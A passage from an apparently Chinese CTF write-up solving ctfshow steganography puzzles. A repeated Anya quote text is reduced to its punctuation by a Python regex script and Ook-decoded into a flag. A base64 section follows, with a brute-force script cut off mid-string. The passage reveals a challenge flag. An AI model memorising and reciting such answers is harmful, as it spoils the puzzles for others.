&#39;阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.好帅好帅!阿尼亚棒吗?可爱,可爱!阿尼亚不想去上学了!阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?交给我吧!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.阿尼亚好兴奋!阿尼亚可爱吗?阿尼亚要加油!阿尼亚在学校也会加油的!好想有个母亲爱我.阿尼亚帅不帅?阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.哇酷哇酷?阿尼亚必须加油!我想永远和他们在一起.阿尼亚棒吗?父亲做菜很好吃.多亏了父亲.营救公主的间谍!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.是住在城堡里的奇美拉!阿尼亚帅不帅?救命呀!救救我！劳埃德曼!好想有个母亲爱我.蓬蓬头?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!哇酷哇酷?阿尼亚喜欢厉害又帅气的母亲.阿尼亚棒吗?太好了!都怪阿尼亚踩到了粑粑.阿尼亚可爱吗?花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚一点也不在意.阿尼亚帅不帅?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚在学校也会加油的!蓬蓬头?阿尼亚必须加油!营救公主的间谍!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚可爱吗?是住在城堡里的奇美拉!阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚帅不帅?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.救命呀!父亲和母亲甜甜蜜蜜.蓬蓬头?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.救救我！劳埃德曼!哇酷哇酷?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!要是不向次子道歉,世界和平就完蛋了.阿尼亚棒吗?看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚可爱吗?欢迎来到阿尼亚家.阿尼亚帅不帅?阿尼亚想吃蛋包饭!阿尼亚想穿这身衣服出萌.蓬蓬头?警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.交给我吧!多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.父亲,阿尼亚合格啦!会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚好兴奋!阿尼亚想穿这身衣服出萌.哇酷哇酷?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.阿尼亚要加油!阿尼亚棒吗?阿尼亚在学校也会加油的!阿尼亚必须加油!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?可爱,可爱!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.父亲,母亲,有需要帮助的人!阿尼亚可爱吗?要帮助他!太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.蓬蓬头?母亲是杀手.哇酷哇酷?花生!父亲和母亲甜甜蜜蜜.阿尼亚棒吗?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.阿尼亚想吃蛋包饭!父亲是间谍.警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!母亲是杀手.阿尼亚可爱吗?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.营救公主的间谍!阿尼亚帅不帅?是住在城堡里的奇美拉!救命呀!欢迎来到阿尼亚家.蓬蓬头?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.哇酷哇酷?阿尼亚不想要这个妈妈.阿尼亚棒吗?救救我！劳埃德曼!父亲是间谍.阿尼亚可爱吗?阿尼亚好想看呀!母亲是杀手.阿尼亚帅不帅?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.完美的劳埃德曼,好想看呀!蓬蓬头?看我必杀拳,砰!好耶!欢迎来到阿尼亚家.哇酷哇酷?父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚棒吗?阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?可爱,可爱!阿尼亚想去你家玩.阿尼亚帅不帅?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!阿尼亚从孤儿院出来以后,遇到了好多开心的事.太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!阿尼亚好失落.蓬蓬头?好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.好帅好帅!哇酷哇酷?可爱,可爱!阿尼亚不想去上学了!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚棒吗?交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚可爱吗?我想永远和他们在一起.阿尼亚帅不帅?救命呀!父亲做菜很好吃.蓬蓬头?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!多亏了父亲.哇酷哇酷?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚想吃蛋包饭!阿尼亚棒吗?警惕!阿尼亚想像母亲一样厉害!阿尼亚喜欢厉害又帅气的母亲.阿尼亚可爱吗?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.阿尼亚帅不帅?我想永远和他们在一起.蓬蓬头?好帅好帅!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.可爱,可爱!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚不想去上学了!阿尼亚可爱吗?交给我吧!父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚帅不帅?阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!蓬蓬头?多亏了父亲.哇酷哇酷?救命呀!太好了.阿尼亚棒吗?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.看我必杀拳,砰!阿尼亚帅不帅?好耶!父亲,母亲,有需要帮助的人!阿尼亚喜欢厉害又帅气的母亲.蓬蓬头?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.哇酷哇酷?会没事的.阿尼亚棒吗?要帮助他!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚可爱吗?我想永远和他们在一起.父亲做菜很好吃.太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.花生!蓬蓬头?阿尼亚想吃蛋包饭!警惕!父亲是间谍.哇酷哇酷?阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚棒吗?母亲是杀手.阿尼亚可爱吗?救命呀!父亲和母亲甜甜蜜蜜.阿尼亚帅不帅?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚好想看呀!哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚帅不帅?好耶!阿尼亚从孤儿院出来以后,遇到了好多开心的事.蓬蓬头?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.父亲,母亲,有需要帮助的人!太好了.哇酷哇酷?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.要帮助他!阿尼亚棒吗?太好了!花生!我想永远和他们在一起.阿尼亚可爱吗?阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚帅不帅?父亲做菜很好吃.蓬蓬头?阿尼亚好想看呀!多亏了父亲.哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!太好了.阿尼亚棒吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.阿尼亚在学校也会加油的!阿尼亚可爱吗?阿尼亚必须加油!营救公主的间谍!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.蓬蓬头?我想永远和他们在一起.哇酷哇酷?是住在城堡里的奇美拉!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.救命呀!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.&#39;temp = re.sub(&#39;[\u4e00-\u9fa5]+&#39;, &#39;&#39;, string)with open(&#39;decrypt_flag.txt&#39;,&#39;w&#39;) as ff:        for i in temp:                if(i == &#39;.&#39; or i == &#39;?&#39; or i == &#39;!&#39; ):                        ff.write(i)print(temp)print(&#39;End&#39;)</code></pre><p>先将文本中的中文的。！？全部换为英文的.!? 在写脚本将其提取出来</p><p>其中’[\u4e00-\u9fa5]+’的意思是unicode编码 且正好是中文编码开始和结束的两个值 这个正则表达式就是用来判断字符串中是否含有中文</p><p>此处在提一下python中re模块中sub功能的用法</p><pre><code class="python">sub()替换,count不写默认为全体换&#39;&#39;&#39;res = re.sub(&#39;[0-9]+&#39;, &#39;?&#39;, &#39;abc2abc8abc4d&#39;, count=2)print(res)  #结果为abc?abc?abc4d</code></pre><p>然后将得到的标点进行Ook解码</p><pre><code class="python">..........,.....,.,..!?,!!.?.,...........,.....,.?,.?!.?..,...........,.....,.,....,...........,..,!.?..,.,....,..!?!!.?........?,.?!.?..!.?,.,....,..!?!！!.?!,!,!!,,!!?.?!.?!!!!!,!!!,!!!.?.....,..!?!!.?..,.,...?.?!,.?........!.?.,.....,.！!?!,!,.?,!!,,!!!!?.?!.?!!!,!!.,...........,...!..,.,....,..........,!.,.....,.,..!.?.,...........,.....!?!!,.?!!!！!!,!,!!,,!!!!!!!!?,.?,!.?!!,!!!!!!!!！!!,!,!!.?.,...........,...,,!?!!.?.,.,....,........?.?!.?.,.....,.,....,.......!.!!!,!!!,!!!!!.?..,.....,.,.!?!!.?..,......?.?！!.?!.?..,.....,.,.,!?,!!.?,,!!!!!!!!?.?,!.?!!,!!!!!!!!！!!,!,!!,,!!,.!!!!!.?.........!?,!!,.?!,!!!!!!!?.?!.?！!!,!,!!,,!!!!.?.,.,....,...!?!!.?.......,.?.?!.?..,.,....,.....,!.?.....,..!?!,!.?!!!!!!?.?!.?！!!,!,.?,....,...,!?!,,!.?......?.?!,.?..!.?.,.,....,.......!?!!.?!!,!!!,!!!!!!!?.?!.?！!!,!,!!,,!!!!!!!!,!!!,!!!!!!!!！!.?,.....,.,....,.....!?,!,!.?.....,.....,.,...?.?!,.?..........,....,,!.?,.,....,...........,.!?!!.?!!!!,!!!,!!!!!!!!！!?.?!.?,!,!!,,!!!!!!!!,!!!,!!!.?,.,....,...........,...!?!!.?.,.,....,...........,.?.?!.?..,.,....,...........,....!.?,.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412095552198.png" alt="image-20230412095552198"></p><p>:horse:ctfshow{4niya_KaWa1i!}</p><h2 id="低端的base64"><a href="#低端的base64" class="headerlink" title="低端的base64"></a>低端的base64</h2><p>base64是常见的用于传输8bit字节码 的编码方式或者说吧二进制变成文本数据的方式。三个原始字符对应着4个base64编码后的字符</p><p>如果需要编码的字节数不能被3整除，最后会多出一两个字节那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个“&#x3D;”号，代表补足的字节数。也就是说，当最后剩余一个八位字节（一个byte）时，最后6位的base64字节块有四位是0值，最后附加上两个等号；如果最后剩余两个八位字节（2byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412155156539.png" alt="image-20230412155156539"></p><p>所以见到加密字符串后面有等号的时候，可以考虑是不是base64编码</p><p>对于该题 可以对于编码后的base64字符4个4个的进行爆破 只要还原出来的3个原始字符在可见字符串的范围内即可</p><pre><code class="python">#encoding = utf-8#脚本是从ctfshow单身杯（2022年5月20日)misc2 没大没小的串串，解题脚本改的import string,base64,reimport itertools, tqdmx=&quot;5li65lqg6ziy5q2i5asn5a625oml5yqo5pon5l2c5oir5bey57up5oqk5byx6i6x6zibkgzsywcp6jep5zyo6l+z5q616k+d55qe5p+q5liq5zyw5pa55lqg77ym5l2g5lus5lin5lia5a6a5om+5b6x5yiw5zof77ym5zi75zi75zi744cc5awx56we5p2l5pwy5l2g5a626zeo77ym5bim552a56ev57sv5zkm54m55b6b77ym5z2m55m95luo5a695oqx5ous5luo5lil77ym5lin5zcs6k+d57uz5l2g5omt5lia6zki44cckgzsywcp5zyo5zoq6yem5zgakgzsywcp5zyo5zoq6yem77ymkgzsywcp5zyo6ykj5bcp5pyl5y+l55qe55y8552b6yem44cc5asp5a+55zyw77ym6zuo5a+56aoo44cc5asn6zmg5a+56zw/56m644cc5bgx6iqx5a+55rw35qcr77ym6lwk5pel5a+56iun56m544cc6zu36zqq6zqq77ym6zu+6jkz6jkz44cc5bya5bic5asn5zcj5lih5lql5lqo6yca44cc5bmz5lue5bmz5lue5bmz5bmz5lue77ym5lue5bmz5lue5bmz5lue5lue5bmz77ym5lue5lue5bmz44cc5lyx5oma5zgo55+l77ymj2n0znnob3cn55qekgzsywcp5yw35ash5lul5lil5yeg5liq54m554k577ym5lia5piv5lulj2n0znnob3cn5bya5as077ym5zco6z2i6lef552a6iqx5ous5y+35zkm5yeg5liq5awh5ocq55qe5lic6kw/77ym6ykj5liq5lic6kw/5y+r5ygaj3v1awqn77ym5li65lua5lmi5ymn6z2i6kab6k+06l+z5lmi5asa5bqf6k+d5zgi5piv5zug5li65lih5lia5lin6k+05bqf6k+d6l+z5liq6aky5bcx5asq5aw95yga5lqg6l+z5oco5lmi5y+v5lul5zgi77ym5lih5lia5pyj5lq65oqk6l+z5liq5lic6kw/5ps+5zyoy3lizxjjagvm6yem5lia5oqk5qkt5l2g5piv5qkt5lin5ye65p2l77ym54s25zco5yan57uz5oir6l+z5lmi5lia5liq6iux5pah5a2x5q+n5lia5liq6iux5pah5a2x5q+n55qe5ps55asn5bcp5yaz77ym6l+z5oco5lmi6io96kgm5zgi77ym6l+z6ikv5a6a5piv5lin6kgm55qe5a+55lin5a+5iwn0znnob3d7ymfzzty0xzfz5asq6zq+5lqgisfj5pyn5lqgvsf95oma5lul5oir6l+z5zue5zc45y+w5pwz6k6t77ym5zyo5ymn5zco6yo95yqg5lqg5lia54k554k55lic5lic77ym6l+z5qc35bcx5lin6io95pyj5bii5ykf5oml5yqo5p2l5ps55lqg5a+55lin5a+55zga44cc5oir5y+j6kkl6yem5pyj5lia5liq5bcp6k6+5ash77ym5y+v5lul6k6/6zeu5yeg5lmo5ywo6yoo55qe5lq657g755+l6k+g44cc5oir5y2055so5a6d5lio5lin6k6k6k+g55qe5lq66l+b6kgm5q+r5peg5osp5lmj55qe5lqj6k6677ym5bm255yl5o6i5aes55qe54wn54mh44cc5b2x5zon57yw56il5pwi546h5pya5asn55qe5zug57sg77ym5lin5piv5l2/55so5l2v56en57yw56il6k+t6kia77ym6icm5piv5pio5pma5l2g55qe552h55yg5piv5zcm5ywf6laz44ccssb3b3jrighhcmqgzxzlcnlkyxkgc28gdghhdcbhbgwgd2hvigxvdmugbwugd2lsbcbizsbwcm91zcbvzibtzseh6z2i5zcr5a+56lgh57yw56il55qe6zeu6aky5piv77ym6buy6k6k5bim5pyj546v5akd44cc5l2g5y+q5ooz6kab5lia5liq6aaz6jwj77ym5l2g5piv5b6x5yiw5lqg5lia5y+q5ou/552a6aaz6jwj55qe5asn54yp54yp77ym55sa6iez6l+y5pyj5pw05liq5lib5p6x44cc5l2g5lin5piv6k6o5y6mj0phdmen77ym5l2g5y+q5piv6k6o5y6m5bel5l2c44cc6icm5bcx5zyo5q2k5pe